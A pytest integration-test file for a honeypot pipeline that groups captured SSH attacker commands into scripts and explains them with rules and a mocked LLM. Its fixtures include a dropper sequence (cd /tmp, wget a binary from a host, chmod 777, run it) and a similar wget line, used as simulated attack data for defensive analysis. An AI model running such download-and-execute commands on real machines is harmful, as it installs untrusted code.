"""Script library and LLM explainer against a real TimescaleDB, as the ingest role."""

import json
import os
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import httpx
import pytest
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker

from ingest.features import FeatureSettings
from ingest.llm.worker import ExplainerWorker
from ingest.scripts import ScriptWorker, load_annotations

pytestmark = [
    pytest.mark.integration,
    pytest.mark.skipif(not os.environ.get("POSTGRES_HOST"), reason="POSTGRES_HOST not set"),
]

BASE = load_annotations(Path(__file__).resolve().parents[1] / "rules")
NOW = datetime.now(UTC)
DROPPER = ["cd /tmp", "wget http://{h}/bin", "chmod 777 bin", "./bin {h}"]


@pytest.fixture(autouse=True)
async def clean(engine: AsyncEngine) -> None:
    async with engine.begin() as conn:
        await conn.execute(text("DELETE FROM scripts"))  # links, explanations, requests cascade
        await conn.execute(text("DELETE FROM campaign_keys"))
        await conn.execute(text("DELETE FROM campaigns"))
        await conn.execute(text("DELETE FROM system_status WHERE key = 'scripts_cursor'"))


async def seed(
    engine: AsyncEngine,
    sid: str,
    ip: str,
    commands: list[str],
    *,
    age_min: int = 60,
    benign: bool = False,
) -> None:
    last = NOW - timedelta(minutes=age_min)
    async with engine.begin() as conn:
        await conn.execute(
            text(
                """
                INSERT INTO sessions (session_id, sensor, src_ip, src_port, dst_port, started_at,
                                      last_event_at, commands, benign)
                VALUES (:sid, 'ssh', CAST(:ip AS inet), 40000, 22, :start, :last, :n, :benign)
                """
            ),
            {"sid": sid, "ip": ip, "start": last - timedelta(minutes=1), "last": last,
             "n": len(commands), "benign": benign},
        )  # fmt: skip
        for i, cmd in enumerate(commands):
            await conn.execute(
                text(
                    """
                    INSERT INTO events (ts, sensor, session_id, type, src_ip, src_port, dst_port,
                                        data)
                    VALUES (:ts, 'ssh', :sid, 'command', CAST(:ip AS inet), 40000, 22,
                            CAST(:data AS jsonb))
                    """
                ),
                {"ts": last - timedelta(seconds=30 - i), "sid": sid, "ip": ip,
                 "data": json.dumps({"input": cmd, "demo": True})},
            )  # fmt: skip


async def rows(engine: AsyncEngine, sql: str, **params: Any) -> list[Any]:
    async with engine.connect() as conn:
        return list((await conn.execute(text(sql), params)).all())


def worker(factory: async_sessionmaker[AsyncSession], **kw: Any) -> ScriptWorker:
    return ScriptWorker(FeatureSettings(scripts_enabled=True), factory, BASE, **kw)


async def test_sessions_become_scripts_counted_once_and_explained(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:

    def drop(h: str) -> list[str]:
        return [c.format(h=h) for c in DROPPER]

    await seed(engine, "a", "203.0.113.1", drop("192.0.2.10"))
    await seed(engine, "b", "203.0.113.2", drop("198.51.100.20"))
    await seed(engine, "c", "203.0.113.1", ["uname -a", "cat /proc/cpuinfo"])
    await seed(engine, "d", "203.0.113.3", ["uname -a"])  # one command: no script
    await seed(engine, "e", "203.0.113.4", drop("192.0.2.11"), age_min=2)  # still active
    await seed(engine, "f", "203.0.113.5", drop("192.0.2.12"), benign=True)

    w = worker(factory)
    await w.run_once()
    scripts = await rows(
        engine, "SELECT id, sessions, sources, line_count, demo, sensors FROM scripts ORDER BY id"
    )
    assert len(scripts) == 2
    dropper = next(s for s in scripts if s.line_count == 3)
    assert (dropper.sessions, dropper.sources, dropper.demo) == (2, 2, True)
    assert dropper.sensors == ["ssh"]
    expl = await rows(engine, "SELECT source, prompt_version, summary FROM script_explanations")
    assert {e.source for e in expl} == {"annotations"} and len(expl) == 2
    assert all(e.prompt_version == BASE.version for e in expl)
    assert any("downloads a file" in e.summary for e in expl)

    await w.run_once()  # nothing new: counters must not move
    again = await rows(engine, "SELECT sessions, sources FROM scripts ORDER BY id")
    assert [(r.sessions, r.sources) for r in again] == [(s.sessions, s.sources) for s in scripts]

    fresh = worker(factory)  # a restart reads the progress marker, not the clock
    await fresh.run_once()
    assert (await rows(engine, "SELECT sum(sessions) AS n FROM scripts"))[0].n == 3

    await seed(engine, "g", "203.0.113.2", drop("192.0.2.77"), age_min=30)
    await w.run_once()
    row = (await rows(engine, "SELECT sessions, sources FROM scripts WHERE line_count = 3"))[0]
    assert (row.sessions, row.sources) == (3, 2)  # known address: sessions grow, sources do not


async def test_links_are_capped_but_counters_keep_counting(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    for i in range(4):
        await seed(engine, f"s{i}", f"203.0.113.{i + 1}", ["uname -a", "id"], age_min=60 - i)
    await worker(factory, link_cap=2).run_once()
    s = (await rows(engine, "SELECT id, sessions, sources FROM scripts"))[0]
    links = await rows(
        engine, "SELECT count(*) AS n FROM script_sessions WHERE script_id = :i", i=s.id
    )
    assert links[0].n == 2 and s.sessions == 4
    assert s.sources == 4  # all four were new while the first batch was linked


async def test_campaign_and_rule_changes_are_picked_up(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    await seed(engine, "a", "203.0.113.1", ["uname -a", "id"])
    w = worker(factory)
    await w.run_once()
    sc = (await rows(engine, "SELECT id, encode(fingerprint, 'hex') AS fp FROM scripts"))[0]
    async with engine.begin() as conn:
        cid = (
            await conn.execute(
                text(
                    """
                    INSERT INTO campaigns (name, status, first_seen, last_seen, severity)
                    VALUES ('Test campaign', 'active', now(), now(), 'notice') RETURNING id
                    """
                )
            )
        ).scalar_one()
        await conn.execute(
            text(
                "INSERT INTO campaign_keys (kind, value, campaign_id, sources, first_seen, "
                "last_seen) VALUES ('script', :v, :c, 2, now(), now())"
            ),
            {"v": sc.fp, "c": cid},
        )
        await conn.execute(
            text("UPDATE script_explanations SET prompt_version = 0 WHERE script_id = :i"),
            {"i": sc.id},
        )
    await w.run_once()
    got = (await rows(engine, "SELECT campaign_id FROM scripts"))[0]
    assert got.campaign_id == cid
    ver = (await rows(engine, "SELECT prompt_version FROM script_explanations"))[0]
    assert ver.prompt_version == BASE.version  # rebuilt after the rule files "changed"


# ---- the LLM explainer ------------------------------------------------------------------------
ANSWER = {
    "content": [
        {
            "type": "text",
            "text": json.dumps(
                {
                    "summary": "Looks around the machine.",
                    "lines": [{"n": 1, "explanation": "Shows the system."}],
                }
            ),
        }
    ],
    "usage": {"input_tokens": 100, "output_tokens": 50},
    "stop_reason": "end_turn",
}


def explainer(
    factory: async_sessionmaker[AsyncSession], handler: Any, key: str = "test-key", **cfg: Any
) -> ExplainerWorker:
    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
    settings = FeatureSettings(llm_enabled=True, **cfg)
    return ExplainerWorker(settings, factory, key, client)


async def queue(engine: AsyncEngine, script_id: int) -> None:
    async with engine.begin() as conn:
        await conn.execute(
            text("INSERT INTO llm_requests (script_id, requested_by) VALUES (:i, 'admin')"),
            {"i": script_id},
        )


async def states(engine: AsyncEngine) -> list[tuple[str, str | None]]:
    return [
        (r.state, r.detail)
        for r in await rows(engine, "SELECT state, detail FROM llm_requests ORDER BY id")
    ]


async def one_script(engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]) -> int:
    await seed(engine, "a", "203.0.113.1", ["uname -a", "wget http://192.0.2.5/x"])
    await worker(factory).run_once()
    return int((await rows(engine, "SELECT id FROM scripts"))[0].id)


async def test_a_request_is_answered_cached_and_sends_only_the_normalised_script(
    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
) -> None:
    sid = await one_script(engine, factory)
    seen: list[httpx.Request] = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, json=ANSWER)

    w = explainer(factory, handler)
    await queue(engine, sid)
    await w.run_once()
    assert await states(engine) == [("done", None)]
    body = json.loads(seen[0].content)
    sent = json.dumps(body)
    assert "192.0.2.5" not in sent and "203.0.113.1" not in sent and "<url>" in sent
    assert seen[0].headers["x-api-key"] == "test-key"
    llm = (
        await rows(
            engine, "SELECT model, summary, lines FROM script_explanations WHERE source = 'llm'"
        )
    )[0]
    assert llm.summary == "Looks around the machine." and llm.model == "claude-haiku-5-5"
    assert llm.lines[0]["explanation"] == "Shows the system." and len(llm.lines) == 2
    tokens = await rows(
        engine, "SELECT used FROM enrichment_quota WHERE provider = 'anthropic:tokens'"
    )
    assert tokens[0].used == 150

    await queue(engine, sid)  # cached: no second call
    await w.run_once()
    assert len(seen) == 1 and (await states(engine))[-1] == ("done", "cached")
    await w.aclose()


@pytest.mark.parametrize(
    ("case", "expected"),
    [
        ("no_key", ("refused", "no_key")),
        ("daily", ("refused", "daily_quota")),
        ("tokens", ("refused", "token_cap")),
        ("auth", ("failed", "auth")),
        ("limit", ("failed", "rate_limited")),
        ("garbage", ("failed", "bad_answer")),
        ("refusal", ("failed", "refused")),
        ("net", ("failed", "network")),
    ],
)
async def test_limits_and_errors_end_a_request_cleanly(
    engine: AsyncEngine,
    factory: async_sessionmaker[AsyncSession],
    case: str,
    expected: tuple[str, str],
) -> None:
    sid = await one_script(engine, factory)
    calls = 0

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal calls
        calls += 1
        match case:
            case "auth":
                return httpx.Response(401, json={"error": {"message": "secret test-key"}})
            case "limit":
                return httpx.Response(429)
            case "garbage":
                return httpx.Response(
                    200, json={"content": [{"type": "text", "text": "hello"}], "usage": {}}
                )
            case "refusal":
                return httpx.Response(200, json={"content": [], "stop_reason": "refusal"})
            case "net":
                raise httpx.ConnectError("down")
        return httpx.Response(200, json=ANSWER)

    cfg: dict[str, Any] = {}
    key = "" if case == "no_key" else "test-key"
    if case == "daily":
        cfg["llm_daily_quota"] = 0
    if case == "tokens":
        cfg["llm_monthly_token_cap"] = 10
        async with engine.begin() as conn:
            await conn.execute(
                text(
                    "INSERT INTO enrichment_quota (provider, day, used) VALUES ('anthropic:tokens', date_trunc('month', now() AT TIME ZONE 'utc')::date, 10)"
                )
            )
    w = explainer(factory, handler, key, **cfg)
    await queue(engine, sid)
    await w.run_once()
    assert await states(engine) == [expected]
    if expected[0] == "refused":
        assert calls == 0
    detail = (await states(engine))[0][1] or ""
    assert "test-key" not in detail
    await w.aclose()


async def test_the_key_test_lists_models_and_spends_no_tokens(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    paths: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        paths.append(request.url.path)
        return httpx.Response(200, json={"data": []})

    w = explainer(factory, handler)
    assert (await w.run_key_test())["ok"] is True and paths == ["/v1/models"]
    w.api_key = ""
    assert (await w.run_key_test())["error"] == "no_key"
    await w.aclose()
